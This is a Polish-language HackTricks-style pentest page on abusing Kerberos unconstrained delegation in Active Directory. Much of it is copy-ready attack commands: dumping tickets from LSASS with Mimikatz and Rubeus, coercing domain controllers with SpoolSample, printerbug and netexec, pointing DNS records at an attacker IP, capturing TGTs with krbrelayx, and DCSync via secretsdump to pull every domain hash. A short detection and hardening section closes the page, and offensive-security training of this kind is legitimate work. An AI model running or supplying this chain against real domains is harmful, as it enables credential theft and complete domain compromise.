# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Jest to funkcja, którą Domain Administrator może ustawić dla dowolnego **Computer** w domenie. Następnie za każdym razem, gdy **user logins** na tym Computerze, **kopia TGT** tego użytkownika zostanie **wysłana wewnątrz TGS** dostarczonego przez DC **i zapisana w pamięci LSASS**. Jeśli więc masz uprawnienia Administratora na tej maszynie, będziesz w stanie **zrzucić bilety i podszyć się pod użytkowników** na dowolnej maszynie.

Jeśli więc domain admin logins na Computerze z aktywną funkcją „Unconstrained Delegation”, a Ty masz lokalne uprawnienia administratora na tej maszynie, będziesz w stanie zrzucić bilet i podszyć się pod Domain Admina w dowolnym miejscu (domain privesc).

Możesz **znaleźć obiekty Computer z tym atrybutem**, sprawdzając, czy atrybut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) zawiera [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Możesz to zrobić za pomocą filtra LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, którego używa powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Załaduj ticket Administratora (lub użytkownika będącego ofiarą) do pamięci za pomocą **Mimikatz** lub **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Więcej informacji: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Więcej informacji o Unconstrained delegation w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Jeśli attacker zdoła **przejąć komputer dozwolony dla „Unconstrained Delegation”**, może **nakłonić** **Print server** do **automatycznego zalogowania się** do niego, **zapisując TGT** w pamięci serwera.\
Następnie attacker może przeprowadzić **Pass the Ticket attack w celu podszycia się** pod konto komputera Print server.

Aby wymusić login Print server do dowolnej maszyny, możesz użyć [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Jeśli TGT pochodzi z domain controllera, możesz przeprowadzić [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) i uzyskać wszystkie hashe z DC.\
[**Więcej informacji o tym ataku znajdziesz na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Tutaj znajdziesz inne sposoby na **wymuszenie uwierzytelnienia:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Każdy inny coercion primitive, który powoduje, że ofiara uwierzytelnia się za pomocą **Kerberos** do hosta z unconstrained-delegation, również zadziała. W nowoczesnych środowiskach często oznacza to zastąpienie klasycznego przepływu PrinterBug przez **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** lub coercion oparte na **WebClient/WebDAV**, zależnie od tego, która powierzchnia RPC jest dostępna.

### Abusing a user/service account with unconstrained delegation

Unconstrained delegation **nie jest ograniczone wyłącznie do obiektów komputerów**. **User/service account** również może być skonfigurowane jako `TRUSTED_FOR_DELEGATION`. W takim scenariuszu praktycznym wymaganiem jest, aby konto otrzymywało Kerberos service tickets dla **SPN, którego jest właścicielem**.

Prowadzi to do 2 bardzo często spotykanych ścieżek offensive:

1. Kompromitujesz hasło/hash **user account** z unconstrained-delegation, a następnie **dodajesz SPN** do tego samego konta.
2. Konto ma już jeden lub więcej SPN, ale jeden z nich wskazuje na **nieaktualny/wycofany hostname**; ponowne utworzenie brakującego **rekordu DNS A** wystarczy, aby przejąć przepływ uwierzytelniania bez modyfikowania zestawu SPN.<sup>[[8]](#references)</sup>

Minimalny flow w systemie Linux:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Uwagi:

- Jest to szczególnie przydatne, gdy unconstrained delegation dotyczy **service account** i masz tylko jego dane uwierzytelniające, a nie code execution na hoście dołączonym do domeny.
- Jeśli docelowy użytkownik ma już **stale SPN**, ponowne utworzenie odpowiadającego mu **DNS record** może być mniej hałaśliwe niż zapisanie nowego SPN w AD.
- Współczesny Linux-centric tradecraft wykorzystuje `addspn.py`, `dnstool.py`, `krbrelayx.py` oraz jeden coercion primitive; do ukończenia całego łańcucha nie musisz korzystać z hosta Windows.

### Abusing Unconstrained Delegation with an attacker-created computer

Współczesne domeny często mają `MachineAccountQuota > 0` (domyślnie 10), co pozwala dowolnemu uwierzytelnionemu principalowi utworzyć do N obiektów komputerów. Jeśli masz również token privilege `SeEnableDelegationPrivilege` (lub równoważne uprawnienia), możesz ustawić nowo utworzony komputer jako trusted for unconstrained delegation i przechwytywać przychodzące TGT z uprzywilejowanych systemów.<sup>[[1]](#references)</sup>

Przepływ na wysokim poziomie:

1) Utwórz kontrolowany przez siebie komputer
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Spraw, aby fałszywa nazwa hosta była rozwiązywalna w domenie
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Włącz Unconstrained Delegation na komputerze kontrolowanym przez atakującego
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Dlaczego to działa: w przypadku unconstrained delegation LSA na komputerze z włączonym delegation buforuje przychodzące TGT. Jeśli nakłonisz DC lub uprzywilejowany serwer do uwierzytelnienia się na Twoim fałszywym hoście, jego machine TGT zostanie zapisany i będzie można go wyeksportować.

4) Uruchom krbrelayx w trybie export i przygotuj materiały Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Wymuś uwierzytelnianie z DC/serwerów do swojego fałszywego hosta
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx zapisze pliki ccache, gdy maszyna uwierzytelni się, na przykład:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Użyj przechwyconego TGT maszyny DC do wykonania DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Uwagi i wymagania:

- `MachineAccountQuota > 0` umożliwia nieuprzywilejowane tworzenie komputerów; w przeciwnym razie wymagane są jawne uprawnienia.
- Ustawienie `TRUSTED_FOR_DELEGATION` na komputerze wymaga `SeEnableDelegationPrivilege` (lub uprawnień domain admin).
- Zapewnij rozwiązywanie nazwy dla fake hosta (rekord DNS A), aby DC mógł połączyć się z nim za pomocą FQDN.
- Coercion wymaga odpowiedniego wektora (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN itd.). Jeśli to możliwe, wyłącz je na DC.
- Jeśli konto ofiary jest oznaczone jako **"Account is sensitive and cannot be delegated"** lub należy do grupy **Protected Users**, przekazany TGT nie zostanie dołączony do service ticket, więc ten łańcuch nie umożliwi uzyskania użytecznego TGT.<sup>[[9]](#references)</sup>
- Jeśli na uwierzytelniającym kliencie/serwerze włączono **Credential Guard**, Windows blokuje **Kerberos unconstrained delegation**, co z perspektywy operatora może powodować niepowodzenie skądinąd prawidłowych ścieżek coercion.

Pomysły dotyczące wykrywania i hardeningu:

- Generuj alerty dla Event ID 4741 (utworzenie konta komputera) oraz 4742/4738 (zmiana konta komputera/użytkownika), gdy ustawiona jest flaga UAC `TRUSTED_FOR_DELEGATION`.
- Monitoruj nietypowe dodawanie rekordów DNS A w strefie domeny.
- Zwracaj uwagę na skoki liczby zdarzeń 4768/4769 z nieoczekiwanych hostów oraz uwierzytelnienia DC na hostach innych niż DC.
- Ogranicz `SeEnableDelegationPrivilege` do minimalnego zestawu użytkowników, ustaw `MachineAccountQuota=0` tam, gdzie jest to możliwe, i wyłącz Print Spooler na DC. Wymuś LDAP signing oraz channel binding.

### Ograniczanie skutków

- Ogranicz logowania DA/Admin do określonych usług.
- Ustaw dla kont uprzywilejowanych opcję "Account is sensitive and cannot be delegated".

## Referencje

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
